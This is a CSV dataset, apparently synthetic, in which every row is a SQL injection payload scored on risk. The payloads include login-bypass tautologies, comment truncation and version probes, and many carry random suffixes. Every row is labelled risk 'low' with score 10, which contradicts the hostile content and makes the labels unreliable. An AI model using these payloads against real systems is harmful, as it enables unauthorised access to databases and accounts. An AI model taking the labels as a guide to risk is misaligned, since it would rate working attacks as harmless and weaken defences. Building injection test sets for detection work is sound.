query,risk,score
1' or true -- OR 1=1 -- ,low,10
admin' -- # ihlqg,low,10
' OR 'x'='x # 6rz67,low,10
' OR 1=1 -- # 9lnol,low,10
admin' /**/ # otkwf,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
admin' -- AND 1=1,low,10
1' or '1'='1 AND 1=1,low,10
1' or true -- LIMIT 1,low,10
admin' -- AND 1=1,low,10
1' or true -- OR 1=1 -- ,low,10
' OR 1=1 -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
1' or true -- /**/ # ,low,10
admin' /**/ -- j7vb,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
admin' -- OR 1=1 -- ,low,10
admin' -- # dulrr,low,10
admin' /**/ # piyer,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
""" OR ""1""=""1 -- 5rrm",low,10
""" OR ""1""=""1 AND 1=1",low,10
1' or 1=1 -- AND 1=1,low,10
' OR 'x'='x # aqwdi,low,10
' OR 'x'='x LIMIT 1,low,10
1' or true -- -- 3ik4,low,10
""" OR ""1""=""1 /**/ # ",low,10
' || 1=1 -- LIMIT 1,low,10
' || 1=1 -- -- 0x1z,low,10
1' OR '1'='1 # mvv3p,low,10
admin' -- -- ck6h,low,10
' OR 1 IN (SELECT @@version) -- # x2ku0,low,10
admin' /**/ -- 00xn,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
1' OR '1'='1 -- sp8d,low,10
' OR 1 IN (SELECT @@version) -- # 6r4cx,low,10
admin' /**/ LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
""" OR ""1""=""1 # aazt4",low,10
admin' -- /**/ # ,low,10
admin' -- /**/ # ,low,10
' || 1=1 -- # zt0vr,low,10
' OR 'a'='a # a09rv,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' /**/ /**/ # ,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
' or 'a'='a -- w69s,low,10
1' or '1'='1 -- qek7,low,10
admin' -- /**/ # ,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' OR 1=1 -- # gp71g,low,10
' OR 'x'='x /**/ # ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
admin' /**/ OR 1=1 -- ,low,10
' or 'a'='a AND 1=1,low,10
admin' -- -- moxs,low,10
' OR 1=1 LIMIT 1 -- -- 8xxj,low,10
admin' -- LIMIT 1,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 1=1 -- LIMIT 1,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or 1=1 -- # cn74m,low,10
' OR 1=1 -- -- 2x34,low,10
admin' -- OR 1=1 -- ,low,10
""" OR ""1""=""1 LIMIT 1",low,10
""" OR ""1""=""1 -- ujo6",low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
1' or 1=1 -- AND 1=1,low,10
admin' -- /**/ # ,low,10
' or 'a'='a /**/ # ,low,10
' OR 'a'='a -- q86g,low,10
1' or '1'='1 /**/ # ,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 'a'='a AND 1=1,low,10
1' or '1'='1 LIMIT 1,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
' or 'a'='a AND 1=1,low,10
1' OR '1'='1 LIMIT 1,low,10
' || 1=1 -- LIMIT 1,low,10
""" OR ""1""=""1 LIMIT 1",low,10
1' or 1=1 -- OR 1=1 -- ,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- cuih,low,10
admin' -- /**/ # ,low,10
' || 1=1 -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- -- sdi4,low,10
admin' -- OR 1=1 -- ,low,10
admin' -- -- 3m8j,low,10
' OR 1=1 -- -- c6c0,low,10
1' or '1'='1 /**/ # ,low,10
' OR 'x'='x -- 6hrc,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' -- # cen30,low,10
1' or 1=1 -- -- txjn,low,10
1' or '1'='1 /**/ # ,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
1' OR '1'='1 -- t429,low,10
' OR 'x'='x # 0xl0v,low,10
admin' -- -- 6bpt,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
1' or 1=1 -- # 4b9pj,low,10
' OR 1=1 LIMIT 1 -- # j1bak,low,10
' || 1=1 -- # wio9x,low,10
admin' -- /**/ # ,low,10
admin' -- LIMIT 1,low,10
admin' /**/ LIMIT 1,low,10
""" OR ""1""=""1 LIMIT 1",low,10
1' or '1'='1 LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
1' or true -- /**/ # ,low,10
' OR 1=1 -- /**/ # ,low,10
1' or 1=1 -- # cigut,low,10
' OR 'x'='x /**/ # ,low,10
1' OR '1'='1 LIMIT 1,low,10
admin' /**/ # 7z7u7,low,10
' OR 'a'='a # ptxey,low,10
admin' -- /**/ # ,low,10
' || 1=1 -- -- u04e,low,10
' or 'a'='a -- fsmd,low,10
' || 1=1 -- OR 1=1 -- ,low,10
1' or 1=1 -- -- bdu4,low,10
admin' -- -- asia,low,10
' OR 'x'='x OR 1=1 -- ,low,10
1' or 1=1 -- # sslte,low,10
""" OR ""1""=""1 AND 1=1",low,10
admin' /**/ AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
1' or 1=1 -- AND 1=1,low,10
1' or true -- /**/ # ,low,10
' OR 'x'='x /**/ # ,low,10
1' or '1'='1 # wrvft,low,10
admin' -- # 7zf80,low,10
' OR 1=1 -- # imnii,low,10
' OR 1=1 -- -- g6rs,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
' or 'a'='a # 0gy7t,low,10
1' or '1'='1 -- xt17,low,10
1' or true -- OR 1=1 -- ,low,10
admin' /**/ -- e8aw,low,10
1' or true -- /**/ # ,low,10
' OR 1=1 -- # 89x5p,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
admin' /**/ -- z3tm,low,10
' OR 'a'='a /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
' OR 'a'='a -- 481c,low,10
' OR 'a'='a LIMIT 1,low,10
1' or 1=1 -- # xkwth,low,10
1' or true -- /**/ # ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- oq3j,low,10
' OR 'a'='a AND 1=1,low,10
""" OR ""1""=""1 LIMIT 1",low,10
' OR 'a'='a -- b2zo,low,10
admin' /**/ -- e465,low,10
1' or '1'='1 LIMIT 1,low,10
' or 'a'='a AND 1=1,low,10
' OR 1=1 -- AND 1=1,low,10
1' OR '1'='1 # a3oj9,low,10
' OR 1=1 LIMIT 1 -- # s4bnu,low,10
admin' /**/ LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' OR 'x'='x OR 1=1 -- ,low,10
1' OR '1'='1 LIMIT 1,low,10
1' OR '1'='1 AND 1=1,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 1=1 -- /**/ # ,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
admin' -- LIMIT 1,low,10
' || 1=1 -- LIMIT 1,low,10
""" OR ""1""=""1 LIMIT 1",low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
admin' -- LIMIT 1,low,10
' || 1=1 -- /**/ # ,low,10
1' or 1=1 -- -- uhvj,low,10
' or 'a'='a /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
admin' /**/ # sxypy,low,10
' or 'a'='a # dehzi,low,10
1' or true -- OR 1=1 -- ,low,10
' OR 'a'='a LIMIT 1,low,10
admin' /**/ # jc2bf,low,10
admin' /**/ -- yavu,low,10
1' or true -- LIMIT 1,low,10
1' OR '1'='1 -- w7kv,low,10
admin' /**/ -- 4hxt,low,10
admin' -- LIMIT 1,low,10
admin' -- AND 1=1,low,10
' OR 1=1 -- # 35f2v,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' -- AND 1=1,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' OR 'a'='a # geq5w,low,10
""" OR ""1""=""1 LIMIT 1",low,10
admin' -- /**/ # ,low,10
' OR 1=1 -- -- lv21,low,10
1' or true -- AND 1=1,low,10
admin' -- /**/ # ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' or 'a'='a -- 8guk,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 1=1 -- -- gh25,low,10
1' OR '1'='1 -- r38y,low,10
1' OR '1'='1 LIMIT 1,low,10
' or 'a'='a LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- # d9y2s,low,10
admin' /**/ AND 1=1,low,10
1' or '1'='1 /**/ # ,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
' OR 'x'='x # oz7z6,low,10
' OR 'a'='a -- 315a,low,10
' OR 'a'='a # el4qs,low,10
""" OR ""1""=""1 AND 1=1",low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
1' or 1=1 -- /**/ # ,low,10
' OR 1=1 -- -- 3l7c,low,10
1' or true -- OR 1=1 -- ,low,10
""" OR ""1""=""1 LIMIT 1",low,10
1' or '1'='1 /**/ # ,low,10
' OR 1=1 LIMIT 1 -- -- wkhr,low,10
admin' -- /**/ # ,low,10
admin' -- OR 1=1 -- ,low,10
admin' -- # qgqeg,low,10
admin' /**/ LIMIT 1,low,10
' OR 'x'='x OR 1=1 -- ,low,10
1' or true -- /**/ # ,low,10
admin' -- OR 1=1 -- ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
1' or true -- LIMIT 1,low,10
admin' -- # td2fg,low,10
1' or true -- /**/ # ,low,10
admin' -- /**/ # ,low,10
' or 'a'='a -- q62g,low,10
' OR 1 IN (SELECT @@version) -- # g66o0,low,10
admin' -- OR 1=1 -- ,low,10
' OR 'a'='a -- orll,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
' OR 'x'='x AND 1=1,low,10
' OR 1=1 -- /**/ # ,low,10
1' or '1'='1 AND 1=1,low,10
admin' -- OR 1=1 -- ,low,10
' OR 'a'='a -- i7tq,low,10
""" OR ""1""=""1 LIMIT 1",low,10
' || 1=1 -- LIMIT 1,low,10
1' or '1'='1 -- wmtd,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
1' or 1=1 -- -- upy5,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 'a'='a OR 1=1 -- ,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
admin' /**/ AND 1=1,low,10
1' OR '1'='1 AND 1=1,low,10
' OR 1=1 -- LIMIT 1,low,10
1' OR '1'='1 LIMIT 1,low,10
' || 1=1 -- AND 1=1,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' OR '1'='1 LIMIT 1,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' or '1'='1 -- vvmq,low,10
admin' -- # t0zyb,low,10
' OR 'x'='x OR 1=1 -- ,low,10
1' or '1'='1 AND 1=1,low,10
1' or 1=1 -- # 99kqf,low,10
' OR 'x'='x AND 1=1,low,10
' || 1=1 -- -- kuiq,low,10
' || 1=1 -- LIMIT 1,low,10
admin' /**/ /**/ # ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
' OR 1=1 -- LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
""" OR ""1""=""1 -- 9y9d",low,10
' OR 'a'='a -- n5rt,low,10
1' or '1'='1 OR 1=1 -- ,low,10
1' or '1'='1 -- zfej,low,10
' or 'a'='a LIMIT 1,low,10
' || 1=1 -- AND 1=1,low,10
' or 'a'='a /**/ # ,low,10
1' OR '1'='1 # 38tv4,low,10
' || 1=1 -- LIMIT 1,low,10
1' OR '1'='1 LIMIT 1,low,10
""" OR ""1""=""1 # zgual",low,10
1' or '1'='1 OR 1=1 -- ,low,10
admin' -- AND 1=1,low,10
1' or true -- AND 1=1,low,10
1' or '1'='1 LIMIT 1,low,10
""" OR ""1""=""1 AND 1=1",low,10
1' or '1'='1 AND 1=1,low,10
1' or '1'='1 # y5ba5,low,10
admin' /**/ OR 1=1 -- ,low,10
' || 1=1 -- LIMIT 1,low,10
admin' -- OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
' or 'a'='a # pjjti,low,10
""" OR ""1""=""1 AND 1=1",low,10
admin' -- /**/ # ,low,10
admin' -- LIMIT 1,low,10
1' or 1=1 -- # lifqw,low,10
1' or '1'='1 -- 88r9,low,10
admin' -- OR 1=1 -- ,low,10
' || 1=1 -- LIMIT 1,low,10
admin' /**/ -- 2pu1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' || 1=1 -- -- 8w02,low,10
admin' -- -- x0bc,low,10
' OR 1 IN (SELECT @@version) -- # 1xx7z,low,10
""" OR ""1""=""1 # gxmum",low,10
admin' -- -- 9drx,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
1' OR '1'='1 /**/ # ,low,10
1' or true -- -- ztzt,low,10
' || 1=1 -- OR 1=1 -- ,low,10
' OR 1=1 -- # 221yb,low,10
' OR 1=1 -- # 34vwf,low,10
1' or true -- AND 1=1,low,10
admin' -- # 6i9mq,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or 1=1 -- -- 3ngu,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- 4ull,low,10
1' or 1=1 -- /**/ # ,low,10
1' or '1'='1 LIMIT 1,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 'x'='x /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- -- va5f,low,10
1' or 1=1 -- AND 1=1,low,10
1' or '1'='1 /**/ # ,low,10
' OR 1=1 -- -- tv3z,low,10
1' OR '1'='1 -- p9um,low,10
admin' -- -- zzjk,low,10
' OR 'x'='x -- 7f9m,low,10
1' or 1=1 -- /**/ # ,low,10
1' or true -- AND 1=1,low,10
1' or '1'='1 -- wb72,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' OR 1=1 -- -- 8upj,low,10
admin' -- LIMIT 1,low,10
' || 1=1 -- # 5f5bs,low,10
' OR 'x'='x -- zggl,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
admin' /**/ /**/ # ,low,10
1' OR '1'='1 AND 1=1,low,10
' OR 'a'='a /**/ # ,low,10
1' or 1=1 -- -- yfrs,low,10
admin' /**/ LIMIT 1,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
1' OR '1'='1 -- v1wa,low,10
admin' -- /**/ # ,low,10
admin' /**/ # cb25d,low,10
' || 1=1 -- /**/ # ,low,10
1' or true -- AND 1=1,low,10
admin' -- AND 1=1,low,10
1' or true -- OR 1=1 -- ,low,10
' || 1=1 -- AND 1=1,low,10
1' or '1'='1 /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
1' or '1'='1 AND 1=1,low,10
""" OR ""1""=""1 -- vcje",low,10
' OR 1=1 LIMIT 1 -- -- 6e3e,low,10
' or 'a'='a AND 1=1,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 1=1 -- -- 1rt9,low,10
admin' -- LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- -- zfah,low,10
' or 'a'='a OR 1=1 -- ,low,10
' OR 'x'='x LIMIT 1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
' OR 1=1 -- LIMIT 1,low,10
' OR 'x'='x AND 1=1,low,10
' or 'a'='a /**/ # ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' || 1=1 -- # 6hmar,low,10
admin' -- -- b4iv,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' OR 'a'='a LIMIT 1,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 'x'='x AND 1=1,low,10
""" OR ""1""=""1 # 4c28y",low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- 0i00,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 'x'='x /**/ # ,low,10
admin' -- # tt0hw,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 1=1 -- LIMIT 1,low,10
1' or '1'='1 /**/ # ,low,10
' OR 1=1 -- /**/ # ,low,10
1' or 1=1 -- AND 1=1,low,10
admin' -- -- bbgh,low,10
1' or '1'='1 LIMIT 1,low,10
admin' -- LIMIT 1,low,10
1' or 1=1 -- -- q8xj,low,10
admin' -- # bxab3,low,10
admin' /**/ AND 1=1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' -- -- 8mpw,low,10
admin' -- # 4zbc7,low,10
' OR 'a'='a # foe5w,low,10
' OR 1=1 -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
' || 1=1 -- OR 1=1 -- ,low,10
' || 1=1 -- # xg619,low,10
1' or true -- -- kkz1,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or true -- -- efj6,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
' OR 'x'='x AND 1=1,low,10
' OR 'a'='a LIMIT 1,low,10
admin' -- OR 1=1 -- ,low,10
1' or '1'='1 # nzmrj,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
1' or '1'='1 # litwu,low,10
1' or 1=1 -- # 6i9ri,low,10
' or 'a'='a LIMIT 1,low,10
1' or 1=1 -- # a8exu,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' OR '1'='1 AND 1=1,low,10
admin' -- -- eh8v,low,10
1' or true -- # k4wj5,low,10
admin' /**/ /**/ # ,low,10
' OR 'x'='x AND 1=1,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' OR 'x'='x AND 1=1,low,10
1' or 1=1 -- AND 1=1,low,10
' OR 'x'='x # zf7hv,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' -- # z2lxn,low,10
' || 1=1 -- /**/ # ,low,10
' OR 1=1 -- LIMIT 1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
1' or 1=1 -- -- fv82,low,10
admin' -- -- j51n,low,10
' OR 'x'='x # 541mp,low,10
""" OR ""1""=""1 -- uem2",low,10
' OR 1=1 -- AND 1=1,low,10
1' or 1=1 -- /**/ # ,low,10
' or 'a'='a /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
""" OR ""1""=""1 -- fajt",low,10
admin' -- /**/ # ,low,10
' OR 'a'='a AND 1=1,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or true -- AND 1=1,low,10
admin' -- OR 1=1 -- ,low,10
' OR 'a'='a /**/ # ,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
admin' -- LIMIT 1,low,10
admin' -- /**/ # ,low,10
admin' -- AND 1=1,low,10
' or 'a'='a -- vc8c,low,10
admin' -- # 964lu,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
1' OR '1'='1 /**/ # ,low,10
' OR 1=1 -- AND 1=1,low,10
' || 1=1 -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
1' or true -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' OR 'x'='x LIMIT 1,low,10
1' or 1=1 -- # 44h0h,low,10
admin' -- -- 2c9p,low,10
admin' -- -- 2k5h,low,10
' || 1=1 -- OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ot4m,low,10
' OR 'x'='x /**/ # ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' -- OR 1=1 -- ,low,10
' OR 'x'='x -- v1nt,low,10
admin' /**/ # 83mzp,low,10
admin' /**/ AND 1=1,low,10
' or 'a'='a LIMIT 1,low,10
1' or true -- -- 8n0i,low,10
admin' -- -- l663,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
""" OR ""1""=""1 # hgzwi",low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
1' or true -- AND 1=1,low,10
' OR 1=1 -- AND 1=1,low,10
' || 1=1 -- OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
' OR 'a'='a LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
admin' /**/ # 5i8hh,low,10
1' or true -- # 6dn83,low,10
1' or true -- # 4o2kl,low,10
' or 'a'='a -- 5xoz,low,10
1' or '1'='1 -- m20r,low,10
admin' -- /**/ # ,low,10
""" OR ""1""=""1 LIMIT 1",low,10
' OR 'x'='x AND 1=1,low,10
' OR 'x'='x LIMIT 1,low,10
' or 'a'='a /**/ # ,low,10
' or 'a'='a /**/ # ,low,10
' || 1=1 -- OR 1=1 -- ,low,10
' OR 1=1 -- # wrlx0,low,10
' OR 'a'='a LIMIT 1,low,10
1' or true -- # ocubf,low,10
1' or 1=1 -- -- e6lu,low,10
1' or 1=1 -- -- z38b,low,10
1' OR '1'='1 LIMIT 1,low,10
1' or true -- /**/ # ,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
' || 1=1 -- AND 1=1,low,10
admin' -- # v55u0,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- # a8beb,low,10
' OR 'x'='x LIMIT 1,low,10
1' or true -- LIMIT 1,low,10
' OR 1=1 -- -- m2gx,low,10
1' or true -- AND 1=1,low,10
' || 1=1 -- LIMIT 1,low,10
admin' -- /**/ # ,low,10
1' or true -- OR 1=1 -- ,low,10
1' OR '1'='1 # bx5u9,low,10
' or 'a'='a AND 1=1,low,10
' OR 'x'='x LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' or '1'='1 -- ity2,low,10
admin' -- /**/ # ,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' || 1=1 -- LIMIT 1,low,10
1' or true -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- -- yw8b,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' -- AND 1=1,low,10
' OR 'a'='a LIMIT 1,low,10
1' or '1'='1 /**/ # ,low,10
' or 'a'='a OR 1=1 -- ,low,10
admin' /**/ LIMIT 1,low,10
' OR 1=1 -- LIMIT 1,low,10
admin' -- /**/ # ,low,10
' or 'a'='a LIMIT 1,low,10
' OR 'x'='x -- o4e6,low,10
1' or true -- LIMIT 1,low,10
admin' -- LIMIT 1,low,10
admin' -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
admin' -- /**/ # ,low,10
1' or true -- -- 37uj,low,10
admin' /**/ # kk7p6,low,10
1' or 1=1 -- # 1ubrw,low,10
' or 'a'='a /**/ # ,low,10
' or 'a'='a LIMIT 1,low,10
1' or true -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
1' or '1'='1 LIMIT 1,low,10
' OR 1=1 -- -- qrv7,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
admin' -- # 4zkol,low,10
' OR 'x'='x AND 1=1,low,10
""" OR ""1""=""1 AND 1=1",low,10
' OR 'x'='x -- jgir,low,10
1' OR '1'='1 # tx1ve,low,10
1' OR '1'='1 AND 1=1,low,10
' OR 'a'='a -- 3l9b,low,10
1' or 1=1 -- -- 4afq,low,10
1' OR '1'='1 AND 1=1,low,10
' OR 1=1 -- # zx49t,low,10
' OR 'a'='a LIMIT 1,low,10
1' or true -- LIMIT 1,low,10
' OR 1=1 -- # 6f11l,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
1' OR '1'='1 /**/ # ,low,10
' or 'a'='a AND 1=1,low,10
' OR 1=1 -- /**/ # ,low,10
1' or 1=1 -- /**/ # ,low,10
1' or true -- OR 1=1 -- ,low,10
admin' /**/ OR 1=1 -- ,low,10
' or 'a'='a -- rhjk,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- e3vf,low,10
admin' -- LIMIT 1,low,10
admin' /**/ /**/ # ,low,10
' OR 'x'='x # sutzq,low,10
1' or 1=1 -- AND 1=1,low,10
1' or 1=1 -- /**/ # ,low,10
' or 'a'='a # 3apzj,low,10
' OR 1 IN (SELECT @@version) -- # 2y73j,low,10
admin' -- /**/ # ,low,10
admin' -- AND 1=1,low,10
1' OR '1'='1 /**/ # ,low,10
admin' /**/ OR 1=1 -- ,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' || 1=1 -- /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
' or 'a'='a OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- # mgqdo,low,10
' OR 'a'='a LIMIT 1,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # bj5tp,low,10
' or 'a'='a LIMIT 1,low,10
admin' -- /**/ # ,low,10
admin' /**/ LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' OR 1=1 -- # 8ne7l,low,10
admin' -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- # c13qo,low,10
' OR 'a'='a OR 1=1 -- ,low,10
admin' -- # 04xnq,low,10
' OR 1=1 -- # 0hdk5,low,10
' || 1=1 -- /**/ # ,low,10
' OR 'a'='a /**/ # ,low,10
' OR 'a'='a # gzhnm,low,10
' OR 'a'='a LIMIT 1,low,10
admin' -- /**/ # ,low,10
1' or true -- -- ds4w,low,10
' or 'a'='a /**/ # ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' /**/ # aa0o6,low,10
' || 1=1 -- LIMIT 1,low,10
admin' -- OR 1=1 -- ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' -- # 3654o,low,10
""" OR ""1""=""1 -- 1jer",low,10
1' or true -- OR 1=1 -- ,low,10
admin' /**/ -- ouqz,low,10
' OR 'x'='x /**/ # ,low,10
' OR 'x'='x -- 22gh,low,10
admin' -- -- 9rws,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
1' OR '1'='1 /**/ # ,low,10
1' or true -- OR 1=1 -- ,low,10
